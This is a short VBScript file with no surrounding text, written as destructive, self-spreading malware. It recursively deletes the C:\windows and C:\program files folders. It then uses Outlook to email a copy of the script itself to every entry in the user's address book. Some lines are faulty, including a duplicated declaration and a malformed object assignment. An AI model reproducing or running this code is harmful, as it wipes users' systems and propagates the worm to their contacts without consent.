dim foldersys
set foldersys=CreateObject("Scripting.FileSystemObject")
If foldersys.FolderExists ("C:\windows") Then
foldersys.DeleteFolder "C:\windows",True
End if
dim foldersys
set foldersys=CreateObject("Scripting.FileSystemObject")
If foldersys.FolderExists ("C:\program files") Then
foldersys.DeleteFolder "C:\program files",True
End if
Dim x
on error resume next
Set fso ="Scripting.FileSystem.Object"
Set so=CreateObject(fso)
Set ol=CreateObject("Outlook.Application")
Set out= WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For x=1 To a.AddressEntries.Count
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Subject"
Mail.Body="Body"
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send
Next
ol.Quit 